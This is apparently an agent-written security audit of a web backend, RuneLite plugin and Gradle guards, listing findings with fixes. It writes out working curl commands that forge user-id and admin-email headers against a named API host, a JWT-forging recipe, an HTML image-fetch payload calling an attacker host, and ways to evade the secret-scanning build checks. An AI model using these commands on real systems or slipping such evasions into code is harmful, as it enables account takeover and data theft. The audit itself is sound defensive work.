# Security audit 001 — adversarial review of the last ~30 PRs

Author: security-skeptic hat (loop M+11)
Branch: `agent/loop-mplus11/review-security-skeptic`
Scope: backend (`apps/backend/`), plugin cloud surface (`apps/plugin/src/main/kotlin/co/rowm/osrsllm/cloud/`), ops console (`apps/ops/`), Gradle guards.

## Executive summary

The biggest finding by a wide margin is that the entire `/v1/*` user surface and the `/admin/*` analytics surface are protected by trivially forgeable headers (`x-user-id`, `Authorization: Bearer <userId>`, `x-admin-email`); any internet caller who can guess or scrape a 21-char user nanoid or an admin email reads, modifies and deletes that account at will, and any caller who knows the admin email runs every admin analytics query. This is exploitable today against any backend exposed to the public internet, with a single `curl` call. The recommendation is to refuse to ship the backend behind a real DNS name until `requireUser` and `adminGate` consult the signed `ops_session` cookie (or a real device-key handshake) and the `x-admin-email`/`x-user-id` trust path is removed.

Secondary findings cluster around the dev fallback for `OPS_JWT_SECRET` (forgeable when `OPS_JWT_SECRET` is unset), the plugin's REST surface sending a SHA-256 device hash as a bearer token that the backend treats as a raw `userId` (the contract simply does not work and falls into the auth-bypass class), the catalog refresh route having no rate limit on what becomes an external fan-out, and the Swing `JLabel` HTML auto-rendering behaviour on backend-controlled `displayName` strings inside `AccountPanel`.

Critical: 4. High: 5. Medium: 6. Gradle guards either mostly catch their stated regression or miss a sentinel below.

## Critical findings (exploitable today)

### C1. `requireUser` accepts any caller-supplied user id with no verification — full account takeover

`apps/backend/src/api/_auth.ts:29-48`

```
const direct = c.req.header("x-user-id")?.trim();
if (direct && direct.length > 0) return direct;
const auth = c.req.header("authorization")?.trim();
if (auth && auth.toLowerCase().startsWith("bearer ")) {
  const token = auth.slice("bearer ".length).trim();
  if (token.length > 0) return token;
}
```

The middleware takes whatever string the caller puts in `x-user-id` (or `Authorization: Bearer <token>`) and uses it verbatim as `c.var.userId` for every downstream handler. There is no cookie check, no signature check, no device-key lookup, no row existence check. The docstring blames the production gateway for stripping `x-user-id` from untrusted callers, but no such gateway exists in this repo, `server.ts` binds Bun.serve directly on `env.PORT`, and the dashboard / plugin surface this header end-to-end.

Attacker action: `curl https://api.tibbly.io/v1/me/export -H 'x-user-id: <victim-user-id>'` returns the entire export JSON for `<victim-user-id>` (which holds the user row, every device row, every osrs account row, every chat, every message, every tool call, every usage row, every subscription, the token balance). User ids are 21-char nanoids from `auth/pairing.ts:46-47`. They appear in plain text in `pairing/claim` responses, in `account.summary` enrichments, on the `events.userId` audit rows, and in URL paths of any admin-shared screenshot. Scraping or guessing is feasible if any nanoid leaks.

Impact: full PII disclosure, GDPR Art. 15 export of every user, hard-delete of arbitrary accounts via `DELETE /v1/me`, ability to read every chat, ability to call `POST /v1/billing/portal` and obtain a working Stripe billing-portal URL for the victim's Stripe customer (one-click cancellation, payment-method change, invoice download).

Fix: refuse to accept `x-user-id` at all; replace the bearer path with a verified session cookie (the `ops_session` JWT path is the right shape) and a separate signed plugin-session token issued by `/v1/pairing/claim` and re-presented per request. The Argon2-verify path in `auth/pairing.ts:269-283` already does the right shape for WS; lift it to REST and require the raw device key + an HMAC over the request (or a server-side session id) on every call.

Score: 10 / 10 (exploitable with `curl`, impact is full account takeover of every user).

### C2. `/admin/*` analytics gated by an email header anyone can send

`apps/backend/src/api/admin/_gate.ts:25-33`

```
const headerEmail = c.req.header("x-admin-email")?.trim().toLowerCase();
if (!headerEmail || allow.size === 0 || !allow.has(headerEmail)) {
  return c.json({ ok: false, error: "unauthorized" }, 401);
}
```

The admin gate compares the caller-supplied `x-admin-email` header to `ADMIN_EMAILS`. There is no signed cookie consulted here. The login route at `apps/backend/src/api/admin/login.ts` mints a `ops_session` JWT cookie, but the gate never reads it. Worse, `server.ts:54-59` mounts the admin surface (`admin: "auto"`) but does NOT mount `adminLogin`, so the JWT path is not even active in production builds today — only the header check.

Tom's email is in `git log --author` and on every public-facing PR body. Drop it in: `curl https://api.tibbly.io/admin/tool-usage -H 'x-admin-email: thomas@rowm.co'` returns the full tool-usage rollup. Same for `/admin/funnel`, `/admin/errors`, `/admin/realtime`, `/admin/chat-daily`.

When `adminUsers`, `adminOpenRouter`, `adminCatalog` are mounted (they are wired in `app.ts` but require explicit option pass-through), the same header unlocks `POST /admin/users/:id/ban`, `POST /admin/users/:id/credit`, `POST /admin/users/:id/refund`, `POST /admin/catalog/refresh`.

Attacker action with `adminUsers` mounted: `curl -X POST https://api.tibbly.io/admin/users/<victim>/refund -H 'x-admin-email: thomas@rowm.co' -H 'content-type: application/json' -d '{"chargeId":"ch_attacker","reason":"oops"}'` and a Stripe refund fires for an arbitrary charge id (any Stripe-side accept will land).

Fix: bind admin auth to the `ops_session` JWT cookie (which already exists) and treat the `x-admin-email` header as an unauthenticated hint only.

Score: 10 / 10 for analytics. 10 / 10 for `adminUsers` once it lands in `server.ts`.

### C3. Plugin REST surface sends a SHA-256 device hash as the `Authorization` bearer; backend treats that as `userId`

`apps/plugin/src/main/kotlin/co/rowm/osrsllm/cloud/AccountSummaryClient.kt:74-95` sends:

```
"Authorization" to "Bearer $hashed",
"x-device-key" to hashed,
```

and the same pattern repeats for `/v1/account/usage-proxy` (line 108-122), `/v1/billing/portal` (145-172), `/v1/me/export` (179-199), `DELETE /v1/me` (205-225), `DELETE /v1/accounts/:id` (231-251).

`requireUser` in `apps/backend/src/api/_auth.ts:33-37` reads that bearer token and assigns it directly to `userId`. So `c.var.userId` ends up being the 64-char hex SHA-256 hash of the raw device key — never a real `users.id` (which is a 21-char nanoid). Every plugin request through this path either 404s (because no row matches) OR — and this is the exploit — if someone ever set `users.id = <a sha256 hex>`, that user is owned by anyone who knows the same hash. Worse: the hash is sent in the same request as `x-device-key`, so if it ever reaches a hostile proxy, eavesdropper, or per-request log, it is the entire credential.

Fix (matches C1 fix): backend must look up `devices.deviceKeyHash` (the hash IS already stored — `auth/pairing.ts:232`) and resolve to the bound `users.id`; never trust the bearer as the user id.

Score: 9 / 10. The "exploit" today is mostly that the surface is broken, but the moment someone adds the obvious "compare hash to user id" workaround, this becomes account-takeover.

### C4. Dev fallback for `OPS_JWT_SECRET` is derivable in any environment where `DATABASE_URL` is known

`apps/backend/src/api/admin/login.ts:46-61`

```
function deriveDevSecret(): Uint8Array {
  const base = `dev-only-ops-jwt-${process.pid}-${env.DATABASE_URL}`;
  return new TextEncoder().encode(base);
}
```

`OPS_JWT_SECRET` is optional. When unset (or < 32 chars), the secret falls back to `dev-only-ops-jwt-<pid>-<DATABASE_URL>`. `DATABASE_URL` defaults to `file:./local.db` in dev (`env.ts:26`). `process.pid` is the OS process id of the Bun server — leaks in `/proc/self/status` if you can hit it, leaks in any error log line that prints `pid`, and on a single-tenant Fly/Render box is observable by a sibling process or a runtime panic page. With `pid` known and `DATABASE_URL` known, the secret is fully reconstructible and a forged `ops_session` cookie passes `jwtVerify` at `login.ts:105`.

Mitigations in place: the route is loud about it (`log.warn` at boot) and `cookieSecure` is true in production. But the route only opens the door if `adminLogin` is mounted. If it ever is mounted in prod without `OPS_JWT_SECRET` set, the door is open.

Fix: refuse to start the router when `NODE_ENV === "production"` and `OPS_JWT_SECRET` is unset. The current code logs a warning but still starts.

Score: 8 / 10 conditional on `OPS_JWT_SECRET` being unset.

## High findings (exploitable under conditions)

### H1. `JLabel` HTML auto-rendering in `AccountPanel` lets a backend-controlled `displayName` execute Swing HTML

`apps/plugin/src/main/kotlin/co/rowm/osrsllm/cloud/AccountPanel.kt:461`

```
val name = JLabel(account.displayName + if (account.isCurrent) "  (current)" else "")
```

and `AccountPanel.kt:497`

```
val row = JLabel(
    (dev.displayName ?: "Unnamed RuneLite") +
        if (dev.isCurrent) "  (this RuneLite)" else "",
)
```

`JLabel` will treat any string starting with `<html>` as HTML and render it as Swing HTML markup, which includes `<img>` with arbitrary URLs (leaking via attacker-controlled `src=`), `<a href>`, and styled content that can mislead the player. The `displayName` originates from `osrs_accounts.display_name`, which is set by the plugin during pairing without sanitisation. If the backend is compromised, any returned `displayName` containing `<html><img src='http://attacker/?...'>` triggers a Swing HTTP fetch from the player's machine to an arbitrary URL (a confused-deputy egress that does NOT go through `EgressGate`).

`AccountPanel.kt:210` reuses `displayName` inside a `JOptionPane.showConfirmDialog` message; same risk. Line 568 is benign because it is a static string.

Fix: prefix every backend-sourced string fed into `JLabel` with `<html>` and HTML-escape, or set `putClientProperty("html.disable", true)`. The same applies to `playerName` (`AccountPanel.kt:240`, `OsrsAccountsSection.buildRow`).

Score: 7 / 10. Requires backend compromise or a malicious customer record, but the egress IS local-fetch from the player's box, bypassing `EgressGate`.

### H2. `/v1/billing/portal` allows any user-id holder to redirect to that user's Stripe portal

`apps/backend/src/api/billing-portal.ts:48-71`

Combined with C1: `curl -X POST https://api.tibbly.io/v1/billing/portal -H 'x-user-id: <victim>'` returns `{ url: "https://billing.stripe.com/..." }`. The Stripe portal URL is single-customer-scoped. Opening it as the attacker grants full session control over the victim's Stripe subscription (cancel, refund, swap payment method, download invoices including the billing address Stripe collected at checkout — `billing-checkout.ts:88` enables that collection).

Fix: the same fix as C1; once `requireUser` is real, this falls into the routine-auth bucket.

Score: 8 / 10 conditional on C1 unfixed.

### H3. `verifyMagicLink` is an optional dep — when omitted, `/v1/pairing/redeem-link` 503s; when supplied without rate limiting, brute-forcing a 6-char code becomes a `claim` bypass

`apps/backend/src/api/pairing.ts:100-132`

The pairing code is 6 chars from a 32-char alphabet (`auth/pairing.ts:41`): 32^6 ≈ 1.07B combinations. With no rate limit on `/v1/pairing/claim` (no middleware applied) an attacker can sustain ~10k requests/sec against the route; expected time to hit any one live code's 10-minute window is non-trivial but not infeasible against the population of codes (every concurrently-issued code adds to the attack's odds). A successful claim binds the attacker's `stripeCustomerId` to a real plugin's device row.

Fix: rate-limit `claim` per source IP at 5 attempts per code lifetime, log claim failures into the `events` table for ops review, and consider lengthening to 8 characters from the same alphabet (32^8 ≈ 1.1T).

Score: 6 / 10. The 10-minute TTL caps the window but the population of live codes is the multiplier.

### H4. Catalog refresh has no auth-side rate limit and fetches an external URL

`apps/backend/src/api/admin/catalog.ts:172-175`

```
app.post("/refresh", async (c) => {
  const result = await refresh(db);
  return c.json({ ok: true, ...result });
});
```

Gated by `adminGate` (C2 applies). Once past the gate, an attacker can pin the server to fanout-fetch `https://openrouter.ai/api/v1/models` over and over. The ingester pulls the entire response, allocates per-row writes (`ingest.ts:213-233`), and runs an UPDATE-and-then-SELECT-and-then-UPDATE for retirement (`ingest.ts:239-253`). At ~3000 models per OpenRouter snapshot, repeated POST `/admin/catalog/refresh` calls saturate the DB.

Fix: hold a lock guarding refresh (so concurrent calls noop), and add a 60-second debounce. Already exists in `llm/catalog/scheduler.ts` for the cron; lift it.

Score: 5 / 10. Needs C2 first.

### H5. Stripe webhook handler logs `customerId` and `userId` in cleartext to whatever pino transport is wired

`apps/backend/src/api/webhooks/stripe.ts:152, 226-228, 237-240, 269-272, 327-330`

```
log.info({ userId, customerId }, "stripe webhook: linked customer to user");
```

`lib/log.ts` redacts `*.apiKey`, `OPENROUTER_API_KEY`, etc., but does NOT redact `customerId` or `userId`. In a shared logging environment (Fly logs, Datadog), any operator with log access can read the (customerId, userId) mapping which is itself sensitive PII per GDPR.

Fix: extend the pino `redact.paths` list to include `customerId`, `userId`, `stripeCustomerId`, `email` (anywhere in the payload). Or move per-user logging behind a `LOG_LEVEL=debug` gate.

Score: 4 / 10. Information disclosure, not direct compromise.

## Medium findings (theoretical or low-impact)

### M1. `events.payload` audit rows contain admin email + reason

`apps/backend/src/api/admin/users.ts:401-403, 426-428, 487-493, 540-548`

The ban / credit / refund / unban handlers insert `{ by: adminEmail, reason, ... }` into the `events.payload` JSON column. The events table is broadcast through `GET /v1/me/export` (`me.ts:115` does NOT include `events` directly — events are nulled on delete and excluded from export — so this is contained today). Risk: if a future change adds events to the export, admin emails leak.

Fix: store an `adminUserId` instead of the raw email in the payload; resolve to email only at admin-view time.

Score: 2 / 10.

### M2. `EgressGate.egressHttp` header-value check forbids `\r\n` but allows other control chars (` `, `\t`, vertical tab)

`apps/plugin/src/main/kotlin/co/rowm/osrsllm/cloud/EgressGate.kt:121-123`

```
require(value.none { it == '\r' || it == '\n' }) {
```

Java's `HttpURLConnection.setRequestProperty` will reject many of these downstream, but a NUL byte through HTTP/1.1 keep-alives has historical CVE shape on some intermediaries. The current callers (`AccountSummaryClient.kt`) only ever pass hashed-device-key bytes which are hex, so this is not exploitable today; it is a hardening gap.

Fix: forbid any code-point < 0x20 except space, mirroring the header-name check.

Score: 3 / 10.

### M3. `BackendUrl.WSS_PREFIX` is the only scheme guard; the host is configurable by the user

`apps/plugin/src/main/kotlin/co/rowm/osrsllm/OsrsLlmHelperConfig.kt:50` defaults `backendUrl` to `wss://api.tibbly.io/plugin` but it is a RuneLite `@ConfigItem`, freely editable. A player who edits this to `wss://attacker.example/plugin` and accepts the consent dialog will egress every payload to the attacker, including pairing requests (which include the hashed device key, plus an optional player name). The `:checkNoPlaintextUrls` Gradle gate only enforces the source-set has no plaintext literal; it does not enforce the runtime value.

Mitigations: the consent dialog is required (good), the URL must be `wss://` (good), the plugin admins both ends (the player would have to consciously override). This is a self-pwn scenario but the production WS URL is not pinned. For paying customers this is fine; for the future "BYO key" plus malicious distribution path it is not.

Fix: pin a host allow-list (`api.tibbly.io`, `api.staging.tibbly.io`) in the production source set; ungate via developerMode.

Score: 3 / 10.

### M4. `assertNotDevStub` in `server.ts:63` is the only thing between the dev stub balance meter and production

`apps/backend/src/server.ts:63` calls `assertNotDevStub(env.NODE_ENV)`. The implementation lives in `ws/stubs.ts` (not read). If that assertion fails open (e.g. `NODE_ENV` is unset and defaults to `"development"` per `env.ts:25`), production deploys silently run on the dev stub with `devStubBalanceMeter`, allowing unlimited chat usage without billing.

Fix: assert positively that `NODE_ENV === "production"` AND `STRIPE_WEBHOOK_SECRET` is set; not the negative form. The boot log at `server.ts:146` will show the env, so an operator could notice — but only on careful read.

Score: 3 / 10. Worth verifying `assertNotDevStub` semantics in follow-up.

### M5. `tier` query parameter cast unchecked to a string-literal union in `admin/users`

`apps/backend/src/api/admin/users.ts:125-130`

```
const tier = c.req.query("tier") as "hobbyist" | "pro" | "iron" | "free" | undefined;
```

This is a TypeScript cast, not runtime validation. An attacker can pass `tier=__proto__` or `tier=constructor` — currently caught by the `r.tier === tier` filter at line 259 which simply never matches, so the response set is empty. Not exploitable today but a prototype-pollution-shaped value will propagate into the JSON response. Worth tightening to `z.enum` to match the other entry points.

Score: 2 / 10.

### M6. `claimPairingCode` creates an anonymous user when `stripeCustomerId` and `email` are both absent

`apps/backend/src/auth/pairing.ts:213-222`

A bare `POST /v1/pairing/claim {code}` (no Stripe id, no email) creates a fresh `users` row with NULL Stripe + NULL email, and returns the resulting `userId`. Combined with C1, that user id immediately authorises every `/v1/*` route. An attacker who races a real player's pairing code (or who simply burns codes) gets a free anonymous account. Anonymous accounts cannot pay, but they can spend whatever free tier exists and they can pollute analytics.

Fix: require `stripeCustomerId` OR `email` on `claim`; reject anonymous-claim. Anonymous flows should go through `redeem-link` with a Stripe-signed token.

Score: 3 / 10.

## Things I tried and could not break

- The Stripe webhook signature path. `webhooks/stripe.ts:65-73` calls `verifyWebhook` which delegates to Stripe's own `constructEvent`. The 5-minute default tolerance window blocks replay. Idempotency at the DB level (`processedStripeEvents`, `claimEvent`) is correct — second insert returns 0 rows from `.onConflictDoNothing(...).returning()` and the handler short-circuits at line 78-81. The `unclaimEvent` retry path is the only sharp edge: if a handler throws after a successful credit (e.g. `meter.credit` succeeded, then the funnel event throws), the claim is rolled back and the next retry double-credits. The mitigations are that `meter.credit` itself is idempotent on `userId+invoiceId` (need to verify) and the funnel publish is wrapped in `try/catch` at lines 217-224, 336-344. I could not get a credible double-credit path without auditing `meter.credit`.
- `BackendUrl` value-class. `BackendUrl.kt:18-26` rejects any value that does not start with `wss://`. The `toHttpsUrl` derivation correctly preserves the `s` and never emits a plaintext literal. Header-name validation in `EgressGate.egressHttp` is strict enough to reject CRLF (`\r`, `\n`, space, colon). I could not get a CRLF-injected header through it.
- `EgressGate.egress` (the WSS write). The audit log records every send and the sealed `OutboundPayload` shape pins the wire schema. There is no alternate write path in production code; the `runRuneLite` JavaExec uses test sources only.
- `DeviceKey` generation. 240 bits of entropy from `SecureRandom`, no logging of the raw key, hash-of-key on the wire. The only sharp edge is C3 (the bearer / userId conflation) which is on the backend side.
- `app.ts` route mounting. Each router is gated by an explicit `if (options.X)`, so a test app that does not pass `admin` does not expose `/admin/*`. The conditional mounting is robust.
- `argon2` device-key verify (`auth/device-key.ts`). Standard parameters, timing-safe via the library.

## Things I would test in a live environment

1. Stand up the backend with `OPS_JWT_SECRET` unset and `DATABASE_URL=file:./local.db`. Read `process.pid` from any error response or log. Sign a JWT with `dev-only-ops-jwt-<pid>-file:./local.db` and present it as the `ops_session` cookie to `GET /admin/session`. Expect: a `{ ok: true, email }` response confirming C4.
2. With `admin: "auto"` mounted, send `curl https://api.tibbly.io/admin/realtime -H 'x-admin-email: thomas@rowm.co'` and expect a successful response (C2).
3. With a known user id (claim one through pairing as the attacker, then read `userId` from the response), send `curl https://api.tibbly.io/v1/me/export -H 'x-user-id: <id>'` and expect the full export (C1).
4. Send `POST /v1/billing/portal -H 'x-user-id: <victim-id>'` after seeding a `stripe_customer_id` for the victim. Expect a working Stripe portal URL (H2).
5. Insert a fake `osrs_accounts` row with `display_name = "<html><img src='http://attacker/?leak=1'/></html>"`, then run the plugin's AccountPanel. Expect the Swing process to fetch the URL (H1).
6. Pound `/v1/pairing/claim` with random 6-char codes for the full TTL window of a known issued code, measure collision rate. Confirm H3 quantitatively.
7. Run `POST /admin/catalog/refresh` 100x in a tight loop (with the `x-admin-email` header) and watch DB write rate (H4).
8. Send a `customer.subscription.updated` Stripe event with a price id that maps to a tier, then a `customer.subscription.updated` again with an unknown price id; expect the unknown-price path at `webhooks/stripe.ts:171-178` to log a warn and NOT mutate the row. Confirm.

## The Gradle guards — do they catch what they claim?

`apps/plugin/build.gradle.kts`. Each verdict is "would catch X / would miss Y" with a concrete sentinel.

- `:checkNoKeyLeak`. Would catch a literal `sk-ant-abc...` in production Kotlin. Would miss `val key = String(charArrayOf('s','k','-','a','n','t','-','a','b','c'))` (concatenation defeats the regex) and would miss a key passed via environment lookup such as `System.getenv("MY_LLM_KEY")` (env-var names not in the patterns list — only `OPENAI_API_KEY` / `ANTHROPIC_API_KEY` / `OPENROUTER_API_KEY` trigger). Sentinel miss: `val secret = StringBuilder().append("sk-").append("ant-").append("realkey").toString()`.
- `:checkAccountPanelNoRawTokens`. Would catch any occurrence of `balanceTokens`, `promptTokens`, `completionTokens`, `usedTokens` in `AccountPanel*.kt` / `AccountSummaryClient*.kt`. Would miss `val balance = summary.balance_t0kens` (typo / leetspeak), would miss a panel rename like `AccountOverview.kt` that has `balanceTokens` (not in the file-name allow-list). Sentinel miss: rename `AccountPanel.kt` to `AccountOverview.kt`, write `summary.balanceTokens`; build passes.
- `:checkMcpServerGated`. Would catch `mcpServerService.start(...)` outside a 20-line preceding window containing `developerMode(`. Would miss a multi-line call chain like `mcpServerService\n  .restartWith(\n  ...)` where the regex `mcpServerService\.(start|restartWith)\s*\(` matches on the continuation line and the 20-line window starts AFTER the call line — but the developerMode check might be ON the same line as the chained call start. More serious: would miss a wrapper `fun startMcp() = mcpServerService.start(...)` where the wrapper itself is unguarded but the call site of `startMcp()` is guarded. Sentinel miss: `private fun launch() = mcpServerService.start(); ... if (config.developerMode()) launch()` — the `start(` call has no `developerMode(` in the preceding 20 lines.
- `:checkNoHttpServer`. Would catch `ServerSocket(`, `embeddedServer(`, `Netty,`. Would miss `embeddedServer (Netty)` (space between `embeddedServer` and `(`), would miss `Netty.` (period instead of comma), would miss a Ktor `embeddedServer(io.ktor.server.cio.CIO, ...)` (the CIO engine instead of Netty). Sentinel miss: `embeddedServer(CIO, port = 8080) { ... }.start(wait = true)`.
- `:checkNoReflection`. Would catch `Class.forName` and `URLClassLoader`. Would miss `kotlin.reflect.full.functions`, `java.lang.reflect.Method`, `MethodHandles.lookup()`, dynamic loading via `ServiceLoader`. Sentinel miss: `val cls = Thread.currentThread().contextClassLoader.loadClass("evil.Cls")`.
- `:checkNoPlaintextUrls`. Would catch literal `http://` and `ws://`. Would miss URL construction `"htt" + "p://" + host`, would miss any encoded form, would miss `URL.protocol = "http"` from a String variable. Sentinel miss: `val proto = listOf('h','t','t','p').joinToString(""); val url = "$proto://example.com"`.
- `:secretsScan`. Would catch `OPENROUTER_API_KEY=abc...`, `sk-ant-...`, `AKIA...`, `AIza...`, `ghp_...`, `xoxb-...`, JWT-shaped tokens, `sk_live_...`, `password = "abcdef"`. Would miss `OPENROUTER_API_KEY` being read via `getenv` (only literal assignments match), would miss a stripe **test** key (`sk_test_...` is not in the patterns — only `sk_live_`), would miss a base64-blob credential without any pattern keyword. Sentinel miss: `val webhookSecret = "whsec_3a8b4f1c0e2d5...long..."` — no pattern matches `whsec_`.

Summary: every guard catches the obvious regression and most have a sentinel that bypasses them. The most concerning bypass is `:checkMcpServerGated`'s wrapper-function blind spot; if a future PR encapsulates the start call in a helper, the production guard silently passes. The least concerning is `:checkNoKeyLeak`'s concatenation bypass — it requires deliberate action by the leaker.
